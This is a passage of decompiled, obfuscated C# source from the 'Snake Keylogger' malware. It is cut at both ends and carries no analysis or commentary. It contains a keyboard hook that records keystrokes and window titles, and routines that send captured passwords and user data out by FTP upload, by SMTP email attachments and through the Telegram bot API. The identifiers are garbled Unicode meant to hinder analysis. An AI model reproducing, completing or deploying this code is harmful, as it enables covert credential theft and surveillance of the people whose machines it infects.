          byte[] buffer1 = \uFFFDk\uFFFDkٷ.հߡj蠺\uFFFD();
          byte[] buffer2 = \uFFFDk\uFFFDkٷ.ʭZŲɛę();
          MemoryStream contentStream1 = new MemoryStream(buffer1);
          MemoryStream contentStream2 = new MemoryStream(buffer2);
          message.Attachments.Add(new Attachment((Stream) contentStream1, "Passwords" + \uFFFDk\uFFFDkٷ.ҡ盀ٗ\uFFFD蠺, "text/plain"));
          message.Attachments.Add(new Attachment((Stream) contentStream2, "User" + \uFFFDk\uFFFDkٷ.ҡ盀ٗ\uFFFD蠺, "text/plain"));
          new SmtpClient(\uFFFDk\uFFFDkٷ.䕃հϒ\uFFFDζ)
          {
            EnableSsl = (Operators.CompareString(\uFFFDk\uFFFDkٷ.\u07FBRľKӺ, "True", false) == 0),
            Port = Conversions.ToInteger(\uFFFDk\uFFFDkٷ.퓜\uFFFDی̲\uFFFD),
            Credentials = ((ICredentialsByHost) new NetworkCredential(\uFFFDk\uFFFDkٷ.\u07C2䕃\uFFFDՕé, \uFFFDk\uFFFDkٷ.\u0089\uDBCC\uDC77ۨʤ))
          }.Send(message);
          message.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(\uFFFDk\uFFFDkٷ.\uFFFD\uFFFDϫ皍쐬, "$%TelegramDv$", false) == 0)
      {
        try
        {
          string str1 = \uFFFDk\uFFFDkٷ.ë\uFFFD㹃ƌۣ("PW | " + Environment.UserName + " | Snake\r\n" + \uFFFDk\uFFFDkٷ.嵱Αӥۨϫ + "\r\n" + \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", \uFFFDk\uFFFDkٷ.鈇ô蠺Kş);
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str2 = "https://api.telegram.org/bot" + \uFFFDk\uFFFDkٷ.\uFFFD\uFFFDtʪ盀 + "/sendDocument?chat_id=" + \uFFFDk\uFFFDkٷ.\u07C2ҏ\u0089\uFFFDߡ + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nPW | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
          \uFFFDk\uFFFDkٷ.ΑިȨˤ늻("SnakePW" + \uFFFDk\uFFFDkٷ.ҡ盀ٗ\uFFFD蠺, "application/x-ms-dos-executable", str2, str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public static byte[] ڿԌУƟ\uFFFD() => Encoding.Unicode.GetBytes("PW | " + Environment.UserName + " | Snake\r\n" + \uFFFDk\uFFFDkٷ.嵱Αӥۨϫ + "\r\n" + \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------");

    public static byte[] \u058F丐Rۣ̆() => Encoding.Default.GetBytes("PW | " + Environment.UserName + " | Snake\r\n" + \uFFFDk\uFFFDkٷ.嵱Αӥۨϫ + "\r\n" + \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------");

    public static void 䇹\uFFFDՄ\uFFFDϱ()
    {
      if (Operators.CompareString(\uFFFDk\uFFFDkٷ.\uFFFD\uFFFDϫ皍쐬, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (\uFFFDk\uFFFDkٷ.Ȩ\u1CFCגēݝ + Ӥ\uD9EE\uDC98\uFFFD恁.Օk\uFFFD\u0089̳.Name + " - Passwords ID - "), \uFFFDk\uFFFDkٷ.ݶƟ\u07B8ƌִ), (object) \uFFFDk\uFFFDkٷ.ҡ盀ٗ\uFFFD蠺)
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(\uFFFDk\uFFFDkٷ.\u26CA鈇ŲRR, \uFFFDk\uFFFDkٷ.ēCŎϘ\u07FB);
          byte[] bytes = Encoding.UTF8.GetBytes("PW | " + Environment.UserName + " | Snake\r\n" + \uFFFDk\uFFFDkٷ.嵱Αӥۨϫ + "\r\n" + \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------");
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(\uFFFDk\uFFFDkٷ.\uFFFD\uFFFDϫ皍쐬, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(\uFFFDk\uFFFDkٷ.\u07C2䕃\uFFFDՕé);
          message.To.Add(\uFFFDk\uFFFDkٷ.\uFFFD\u00BEӥ\u00BE\u061D);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          message.Body = "PW | " + Environment.UserName + " | Snake\r\n\r\n\r\n";
          byte[] buffer1 = \uFFFDk\uFFFDkٷ.ڿԌУƟ\uFFFD();
          byte[] buffer2 = \uFFFDk\uFFFDkٷ.\u058F丐Rۣ̆();
          MemoryStream contentStream1 = new MemoryStream(buffer1);
          MemoryStream contentStream2 = new MemoryStream(buffer2);
          message.Attachments.Add(new Attachment((Stream) contentStream1, "Passwords" + \uFFFDk\uFFFDkٷ.ҡ盀ٗ\uFFFD蠺, "text/plain"));
          message.Attachments.Add(new Attachment((Stream) contentStream2, "User" + \uFFFDk\uFFFDkٷ.ҡ盀ٗ\uFFFD蠺, "text/plain"));
          new SmtpClient(\uFFFDk\uFFFDkٷ.䕃հϒ\uFFFDζ)
          {
            EnableSsl = (Operators.CompareString(\uFFFDk\uFFFDkٷ.\u07FBRľKӺ, "True", false) == 0),
            Port = Conversions.ToInteger(\uFFFDk\uFFFDkٷ.퓜\uFFFDی̲\uFFFD),
            Credentials = ((ICredentialsByHost) new NetworkCredential(\uFFFDk\uFFFDkٷ.\u07C2䕃\uFFFDՕé, \uFFFDk\uFFFDkٷ.\u0089\uDBCC\uDC77ۨʤ))
          }.Send(message);
          message.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(\uFFFDk\uFFFDkٷ.\uFFFD\uFFFDϫ皍쐬, "$%TelegramDv$", false) == 0)
      {
        try
        {
          string str1 = "PW | " + Environment.UserName + " | Snake\r\n" + \uFFFDk\uFFFDkٷ.嵱Αӥۨϫ + "\r\n" + \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------";
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str2 = "https://api.telegram.org/bot" + \uFFFDk\uFFFDkٷ.\uFFFD\uFFFDtʪ盀 + "/sendDocument?chat_id=" + \uFFFDk\uFFFDkٷ.\u07C2ҏ\u0089\uFFFDߡ + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nPW | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
          \uFFFDk\uFFFDkٷ.ΑިȨˤ늻("SnakePW" + \uFFFDk\uFFFDkٷ.ҡ盀ٗ\uFFFD蠺, "application/x-ms-dos-executable", str2, str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    private static void \uFFFDBӓҚ\uFFFD(object œŔƚϱܣ, EventArgs ę콪ƚִٚ)
    {
      if (Operators.CompareString(\uFFFDk\uFFFDkٷ.\uFFFD\uFFFDϫ皍쐬, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (\uFFFDk\uFFFDkٷ.Ȩ\u1CFCגēݝ + Ӥ\uD9EE\uDC98\uFFFD恁.Օk\uFFFD\u0089̳.Name + " - Passwords ID - "), \uFFFDk\uFFFDkٷ.ݶƟ\u07B8ƌִ), (object) \uFFFDk\uFFFDkٷ.ҡ盀ٗ\uFFFD蠺)
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(\uFFFDk\uFFFDkٷ.\u26CA鈇ŲRR, \uFFFDk\uFFFDkٷ.ēCŎϘ\u07FB);
          byte[] bytes = Encoding.UTF8.GetBytes("PW | " + Environment.UserName + " | Snake\r\n" + \uFFFDk\uFFFDkٷ.嵱Αӥۨϫ + "\r\n" + \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------");
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(\uFFFDk\uFFFDkٷ.\uFFFD\uFFFDϫ皍쐬, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(\uFFFDk\uFFFDkٷ.\u07C2䕃\uFFFDՕé);
          message.To.Add(\uFFFDk\uFFFDkٷ.\uFFFD\u00BEӥ\u00BE\u061D);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          message.Body = "PW | " + Environment.UserName + " | Snake\r\n\r\n\r\n";
          byte[] buffer1 = \uFFFDk\uFFFDkٷ.ڿԌУƟ\uFFFD();
          byte[] buffer2 = \uFFFDk\uFFFDkٷ.\u058F丐Rۣ̆();
          MemoryStream contentStream1 = new MemoryStream(buffer1);
          MemoryStream contentStream2 = new MemoryStream(buffer2);
          message.Attachments.Add(new Attachment((Stream) contentStream1, "Passwords" + \uFFFDk\uFFFDkٷ.ҡ盀ٗ\uFFFD蠺, "text/plain"));
          message.Attachments.Add(new Attachment((Stream) contentStream2, "User" + \uFFFDk\uFFFDkٷ.ҡ盀ٗ\uFFFD蠺, "text/plain"));
          new SmtpClient(\uFFFDk\uFFFDkٷ.䕃հϒ\uFFFDζ)
          {
            EnableSsl = (Operators.CompareString(\uFFFDk\uFFFDkٷ.\u07FBRľKӺ, "True", false) == 0),
            Port = Conversions.ToInteger(\uFFFDk\uFFFDkٷ.퓜\uFFFDی̲\uFFFD),
            Credentials = ((ICredentialsByHost) new NetworkCredential(\uFFFDk\uFFFDkٷ.\u07C2䕃\uFFFDՕé, \uFFFDk\uFFFDkٷ.\u0089\uDBCC\uDC77ۨʤ))
          }.Send(message);
          message.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(\uFFFDk\uFFFDkٷ.\uFFFD\uFFFDϫ皍쐬, "$%TelegramDv$", false) == 0)
      {
        try
        {
          string str1 = "PW | " + Environment.UserName + " | Snake\r\n" + \uFFFDk\uFFFDkٷ.嵱Αӥۨϫ + "\r\n" + \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------";
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str2 = "https://api.telegram.org/bot" + \uFFFDk\uFFFDkٷ.\uFFFD\uFFFDtʪ盀 + "/sendDocument?chat_id=" + \uFFFDk\uFFFDkٷ.\u07C2ҏ\u0089\uFFFDߡ + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nPW | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
          \uFFFDk\uFFFDkٷ.ΑިȨˤ늻("SnakePW" + \uFFFDk\uFFFDkٷ.ҡ盀ٗ\uFFFD蠺, "application/x-ms-dos-executable", str2, str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public static object 嵱հ\uFFFDܹ꾯()
    {
      DriveInfo[] drives = DriveInfo.GetDrives();
      int index = 0;
      long num;
      while (index < drives.Length)
      {
        DriveInfo driveInfo = drives[index];
        if (driveInfo.IsReady)
          checked { num += driveInfo.TotalSize; }
        checked { ++index; }
      }
      return (object) Conversions.ToString(checked ((long) Math.Round(unchecked ((double) num / 1048576.0 / 1024.0))));
    }

    public static void \uFFFDɇ\u07BBc\u00AB()
    {
    }

    public static void \uFFFDƟک꾯ꓞ()
    {
    }

    public static void מᔖﾭ\uFFFDջ()
    {
    }

    public static void 鈇ҡ\uFFFDבɢ()
    {
    }

    public static void 쐬ٵ恁恁̀()
    {
    }

    public static void \uFFFDϱ\u00BEŎ\uFFFD()
    {
    }

    public static void ľ̔kۚ\uFFFD()
    {
    }

    public static void \u02E8ܪᔖ泮\uFFFD()
    {
    }

    public static void 늻ޗ㹃Ɖϒ()
    {
    }

    public static void \uFFFDҟ\uFFFD\uFFFD䇹()
    {
    }

    public static void U\uFFFD\uFFFD\u0026\uFFFD()
    {
    }

    public static void \u061Cٵˤ뜸ľ()
    {
    }

    public static void \u06E8ٵۚ퓜ɩ()
    {
    }

    public static void ܪʭĪ恁Ю()
    {
      try
      {
        \uFFFDk\uFFFDkٷ.Մӓ쐬\uFFFD\u0609.Interval = 1;
        \uFFFDk\uFFFDkٷ.Մӓ쐬\uFFFD\u0609.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \u05C9W\uFFFDջş()
    {
      try
      {
        \uFFFDk\uFFFDkٷ.뜸쐬\uFFFDܪ\uFFFD();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \u0739ҭɮ\uFFFDΑ()
    {
      try
      {
        \uFFFDk\uFFFDkٷ.\uFFFDݶȨÒˤ();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void ג\u002Dִ̀泮()
    {
    }

    public static void 丐߂ľ\uFFFDӚ()
    {
    }

    public static void ʪ\uFFFDëﾭ\uFFFD()
    {
      if (Operators.ConditionalCompareObjectEqual(\uFFFDk\uFFFDkٷ.ôӚϒЅş, (object) "ProtectTrue", false))
      {
        if (Operators.CompareString(\uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9, "", false) == 0)
          return;
        \uFFFDk\uFFFDkٷ.ɛ\uFFFD\uFFFDB\u00BE();
        Thread.Sleep(8000);
        \uFFFDk\uFFFDkٷ.\uFFFD\uFFFDܣU\uFFFD();
        Thread.Sleep(3000);
        \uFFFDk\uFFFDkٷ.ݶ\uFFFD\uFFFDΑ퓜();
        Thread.Sleep(3000);
        \uFFFDk\uFFFDkٷ.\u0333թ\uFFFDԜջ();
        Thread.Sleep(3000);
        \uFFFDk\uFFFDkٷ.ڿ\uFFFDŁɇ쐬();
      }
      else if (Operators.CompareString(\uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9, "", false) != 0)
      {
        \uFFFDk\uFFFDkٷ.䇹\uFFFDՄ\uFFFDϱ();
        Thread.Sleep(8000);
        \uFFFDk\uFFFDkٷ.\u065Aױ\uFFFDΠا();
        Thread.Sleep(3000);
        \uFFFDk\uFFFDkٷ.ݶ\uFFFD\uFFFDΑ퓜();
        Thread.Sleep(3000);
        \uFFFDk\uFFFDkٷ.\u0333թ\uFFFDԜջ();
        Thread.Sleep(3000);
        \uFFFDk\uFFFDkٷ.ڿ\uFFFDŁɇ쐬();
      }
    }

    public static void ݶ\uFFFD\uFFFDΑ퓜()
    {
      try
      {
        \uFFFDk\uFFFDkٷ.ϒΠ\uFFFDՄ㹃.Start();
        \uFFFDk\uFFFDkٷ.ϒΠ\uFFFDՄ㹃.Interval = 100;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        \uFFFDk\uFFFDkٷ.䇹і̧\u05C9㹃.Start();
        \uFFFDk\uFFFDkٷ.䇹і̧\u05C9㹃.Interval = Convert.ToInt32("1200000");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \u0333թ\uFFFDԜջ()
    {
      try
      {
        \uFFFDk\uFFFDkٷ.\uFFFDܣųϒި.Start();
        \uFFFDk\uFFFDkٷ.\uFFFDܣųϒި.Interval = Convert.ToInt32("1200000");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void ڿ\uFFFDŁɇ쐬()
    {
      try
      {
        \uFFFDk\uFFFDkٷ.KƌWɩB.Start();
        \uFFFDk\uFFFDkٷ.KƌWɩB.Interval = Convert.ToInt32("1200000");
        \uFFFDk\uFFFDkٷ.\u002D\uFFFDȨë\u0026();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \uFFFD\uFFFDܣU\uFFFD()
    {
      try
      {
        \uFFFDk\uFFFDkٷ.ԜƟל\uFFFDӚ.Start();
        \uFFFDk\uFFFDkٷ.ԜƟל\uFFFDӚ.Interval = Convert.ToInt32("1200000");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \u065Aױ\uFFFDΠا()
    {
      try
      {
        \uFFFDk\uFFFDkٷ.Цi\uFFFD\u26CA\uFFFD.Start();
        \uFFFDk\uFFFDkٷ.Цi\uFFFD\u26CA\uFFFD.Interval = Convert.ToInt32("1200000");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [STAThread]
    public static void Main()
    {
      try
      {
        \uFFFDk\uFFFDkٷ.鈇ҡ\uFFFDבɢ();
        \uFFFDk\uFFFDkٷ.\uFFFDɇ\u07BBc\u00AB();
        \uFFFDk\uFFFDkٷ.מᔖﾭ\uFFFDջ();
        \uFFFDk\uFFFDkٷ.쐬ٵ恁恁̀();
        \uFFFDk\uFFFDkٷ.\uFFFDϱ\u00BEŎ\uFFFD();
        \uFFFDk\uFFFDkٷ.ľ̔kۚ\uFFFD();
        \uFFFDk\uFFFDkٷ.kŎ\uFFFDթ\uFFFD();
        \uFFFDk\uFFFDkٷ.\u02E8ܪᔖ泮\uFFFD();
        \uFFFDk\uFFFDkٷ.늻ޗ㹃Ɖϒ();
        \uFFFDk\uFFFDkٷ.\uFFFDҟ\uFFFD\uFFFD䇹();
        \uFFFDk\uFFFDkٷ.U\uFFFD\uFFFD\u0026\uFFFD();
        \uFFFDk\uFFFDkٷ.\u061Cٵˤ뜸ľ();
        \uFFFDk\uFFFDkٷ.\uFFFDƟک꾯ꓞ();
        \uFFFDk\uFFFDkٷ.\u06E8ٵۚ퓜ɩ();
        \uFFFDk\uFFFDkٷ.\u05C9W\uFFFDջş();
        \uFFFDk\uFFFDkٷ.\u0739ҭɮ\uFFFDΑ();
        \uFFFDk\uFFFDkٷ.ג\u002Dִ̀泮();
        ک\uFFFD鈟ٷΩ.\u0657\uFFFDɢ\u060C\u07B4();
        ک\uFFFD鈟ٷΩ.嵱̧Юٗ\u07FB();
        ک\uFFFD鈟ٷΩ.\u07B9ε\uDAE4\uDE26\u07B8();
        ک\uFFFD鈟ٷΩ.\u0314泮ϒK\uFFFD();
        ک\uFFFD鈟ٷΩ.ʓ\uFFFDҢ\uFFFDִ();
        ک\uFFFD鈟ٷΩ.Ł\u0040Մٚі();
        ک\uFFFD鈟ٷΩ.ēӤ؜ƌô();
        ک\uFFFD鈟ٷΩ.ƚ\uDB0A\uDEBAߟמ();
        ک\uFFFD鈟ٷΩ.Ѕ\u07FB\u005Eœٷ();
        ک\uFFFD鈟ٷΩ.븤ҏ\uFFFD꾯\u0040();
        ک\uFFFD鈟ٷΩ.\u07A8\uFFFDOӤᔖ();
        ک\uFFFD鈟ٷΩ.BBמі\uFFFD();
        ک\uFFFD鈟ٷΩ.\uFFFDջױ\u0026\uFFFD();
        ک\uFFFD鈟ٷΩ.ߟŁ\uFFFDɢأ();
        ک\uFFFD鈟ٷΩ.ҡ\uD9D8\uDDB5븤ި();
        ک\uFFFD鈟ٷΩ.\uFFFDľթל\uFFFD();
        ک\uFFFD鈟ٷΩ.\uFFFDëʤ؜\u061D();
        ک\uFFFD鈟ٷΩ.꾯اУܣR();
        ک\uFFFD鈟ٷΩ.Թή̧թ\u02F3();
        ک\uFFFD鈟ٷΩ.\uFFFD㹃ɢ\u0385ɛ();
        ک\uFFFD鈟ٷΩ.\uFFFD嵱\uFFFDB\uFFFD();
        ک\uFFFD鈟ٷΩ.丐\uF0B9ʪ콪\uFFFD();
        ک\uFFFD鈟ٷΩ.ܪŔ̔\u26CA\u07B4();
        ک\uFFFD鈟ٷΩ.\uFFFD\uFFFDԌ\uFFFD\u061D();
        ک\uFFFD鈟ٷΩ.Ӥ\uFFFDéҏÒ();
        ک\uFFFD鈟ٷΩ.\u05B5̱\uFFFDߡŴ();
        ک\uFFFD鈟ٷΩ.מΩ\uFFFD\uFFFDչ();
        ک\uFFFD鈟ٷΩ.\uFFFDζɩ\u005E㹃();
        ک\uFFFD鈟ٷΩ.ױߡԌ\uFFFD\u07FB();
        ک\uFFFD鈟ٷΩ.\uFFFDհ\u05C9\uFFFDЦ();
        ک\uFFFD鈟ٷΩ.\u02F3ҟ\uFFFDՄ\uFFFD();
        ک\uFFFD鈟ٷΩ.Ю\uFFFD\u02E8\uFFFD\u07FB();
        ک\uFFFD鈟ٷΩ.恁ޤ\u00AB\uFFFDӛ();
        ک\uFFFD鈟ٷΩ.퓜ϒٵ\uFFFDا();
        ک\uFFFD鈟ٷΩ.ʤ\uFFFDW皍쐬();
        ک\uFFFD鈟ٷΩ.ߡݶܪzj();
        ک\uFFFD鈟ٷΩ.꾯\uFFFDˤŚʓ();
        ک\uFFFD鈟ٷΩ.Bߟ\uFFFDс\uFFFD();
        ک\uFFFD鈟ٷΩ.盀ŲՄē\uFFFD();
        ک\uFFFD鈟ٷΩ.ɢjۣأ\u0097();
        ک\uFFFD鈟ٷΩ.\u0327盀jē\uFFFD();
        ک\uFFFD鈟ٷΩ.丐Ԍ\u02E8չ鈇();
        ک\uFFFD鈟ٷΩ.ŔΑ\uFFFD똛ޗ();
        ک\uFFFD鈟ٷΩ.ɮ\uFFFD\uFFFDݝ\u07B8();
        ک\uFFFD鈟ٷΩ.\u05C1œj恁\uFFFD();
        ک\uFFFD鈟ٷΩ.늻̔ױ똛\u07FB();
        ک\uFFFD鈟ٷΩ.Ă\uFFFD\uFFFD똛ʤ();
        ک\uFFFD鈟ٷΩ.뜸\uFFFDϘε\uFFFD();
        ک\uFFFD鈟ٷΩ.뫆\uFFFD\uFFFDK\uF0B9();
        ک\uFFFD鈟ٷΩ.ƜZջŚӚ();
        ک\uFFFD鈟ٷΩ.\u003BҟٗأO();
        ک\uFFFD鈟ٷΩ.\u06E3ɩm\u005E꼺();
        쐬A恁K츠.AW蠺\u0385U();
        쐬A恁K츠.\u0300Ś\uFFFDŲˤ();
        쐬A恁K츠.ݝëЅ2c();
        쐬A恁K츠.ٵ̔ŴŴ嵱();
        쐬A恁K츠.ҏÒ\uFFFD츠ҟ();
        쐬A恁K츠.Ӻ\u26CAУ䕃\u00AB();
        쐬A恁K츠.\u02E8鈟מל\uFFFD();
        쐬A恁K츠.\uFFFD\uFFFD̀ôƌ();
        쐬A恁K츠.ôϘ\uFFFDƌ\uFFFD();
        쐬A恁K츠.ÒΩՕ\u002Dأ();
        \uFFFDk\uFFFDkٷ.丐߂ľ\uFFFDӚ();
        \uFFFDk\uFFFDkٷ.ʪ\uFFFDëﾭ\uFFFD();
        Application.Run();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public delegate void KeyLoggerEventArgsEventHandler(
      object sender,
      \uFFFDk\uFFFDkٷ.KeyLoggerEventArgs e);

    public class KeyLoggerEventArgs : EventArgs
    {
      private Keys _keys;
      private string _stringValue;

      public KeyLoggerEventArgs(Keys key, string stringValue)
      {
        this._keys = key;
        this._stringValue = stringValue;
      }

      public Keys Key => this._keys;

      public string StringValue => this._stringValue;
    }

    public class KeyLogger : IDisposable
    {
      private \uFFFDk\uFFFDkٷ.KeyLogger.KeyboardProc _hookCallback;
      private IntPtr _hook;
      private string _currentWindow;
      private bool _newWindow;

      [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern IntPtr SetHook(
        int hook,
        \uFFFDk\uFFFDkٷ.KeyLogger.KeyboardProc KeyDelegate,
        IntPtr HMod,
        int ThreadId);

      [DllImport("user32", EntryPoint = "CallNextHookEx", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int CallNextHook(IntPtr hook, int code, int direction, ref Keys key);

      [DllImport("user32", EntryPoint = "UnhookWindowsHookEx", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int UnHook(IntPtr hook);

      public event \uFFFDk\uFFFDkٷ.KeyLoggerEventArgsEventHandler KeyDown;

      public event \uFFFDk\uFFFDkٷ.KeyLoggerEventArgsEventHandler KeyUp;

      public string CurrentWindow => this._currentWindow;

      public KeyLogger()
      {
        this._hookCallback = new \uFFFDk\uFFFDkٷ.KeyLogger.KeyboardProc(this.ProcessKey);
        this._hook = \uFFFDk\uFFFDkٷ.KeyLogger.SetHook(13, this._hookCallback, IntPtr.Zero, 0);
        if (!(this._hook == IntPtr.Zero))
          ;
        this.InitializeCaptionLogging();
      }

      private int ProcessKey(int code, int direction, ref Keys key)
      {
        if (code == 0)
        {
          if (direction == 256)
          {
            // ISSUE: reference to a compiler-generated field
            \uFFFDk\uFFFDkٷ.KeyLoggerEventArgsEventHandler keyDownEvent = this.KeyDownEvent;
            if (keyDownEvent != null)
              keyDownEvent((object) this, new \uFFFDk\uFFFDkٷ.KeyLoggerEventArgs(key, this.Identifykey(key)));
          }
          else if (direction == 260)
          {
            // ISSUE: reference to a compiler-generated field
            \uFFFDk\uFFFDkٷ.KeyLoggerEventArgsEventHandler keyUpEvent = this.KeyUpEvent;
            if (keyUpEvent != null)
              keyUpEvent((object) this, new \uFFFDk\uFFFDkٷ.KeyLoggerEventArgs(key, this.Identifykey(key)));
          }
        }
        return \uFFFDk\uFFFDkٷ.KeyLogger.CallNextHook(this._hook, code, direction, ref key);
      }

      private string Identifykey(Keys k)
      {
        bool flag = Ӥ\uD9EE\uDC98\uFFFD恁.Օk\uFFFD\u0089̳.Keyboard.ShiftKeyDown;
        if (Ӥ\uD9EE\uDC98\uFFFD恁.Օk\uFFFD\u0089̳.Keyboard.CapsLock)
          flag = !flag;
        string str;
        try
        {
          switch (k)
          {
            case Keys.Back:
            case Keys.End:
            case Keys.Delete:
            case Keys.F1:
            case Keys.F2:
            case Keys.F3:
            case Keys.F4:
            case Keys.F5:
            case Keys.F6:
            case Keys.F7:
            case Keys.F8:
            case Keys.F9:
            case Keys.F10:
            case Keys.F11:
            case Keys.F12:
              str = "[" + k.ToString() + "]";
              break;
            case Keys.Tab:
              str = "[TAP]";
              break;
            case Keys.Return:
              str = "[ENTR]";
              break;
            case Keys.Space:
              str = " ";
              break;
            default:
              str = !flag ? this.VKCodeToUnicode(checked ((uint) k)) : this.VKCodeToUnicode(checked ((uint) k)).ToUpper();
              break;
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          if (flag)
          {
            str = Strings.ChrW((int) k).ToString().ToUpper();
            ProjectData.ClearProjectError();
          }
          else
          {
            str = Strings.ChrW((int) k).ToString().ToLower();
            ProjectData.ClearProjectError();
          }
        }
        return str;
      }

      private string VKCodeToUnicode(uint VKCode)
      {
        try
        {
          StringBuilder stringBuilder = new StringBuilder();
          byte[] numArray = new byte[(int) byte.MaxValue];
          if (!\uFFFDk\uFFFDkٷ.ųޗãēב(numArray))
            return "";
          uint num1 = \uFFFDk\uFFFDkٷ.\uFFFD㹃\uFFFD\uFFFDۚ(VKCode, 0U);
          IntPtr num2 = \uFFFDk\uFFFDkٷ.鈟ϫױ恁k();
          int num3 = 0;
          IntPtr num4 = (IntPtr) \uFFFDk\uFFFDkٷ.\uFFFD泮\u05C9\uFFFDҚ(\uFFFDk\uFFFDkٷ.ҏЅۨ\uFFFD\u0089(num2, ref num3));
          \uFFFDk\uFFFDkٷ.\u0739\u02F3CŔ\u058F(VKCode, num1, numArray, stringBuilder, 5, 0U, num4);
          return stringBuilder.ToString();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        return ((Keys) checked ((int) VKCode)).ToString();
      }

      private void InitializeCaptionLogging() => new Thread((ThreadStart) (() =>
      {
        while (true)
        {
          StringBuilder stringBuilder = new StringBuilder(256);
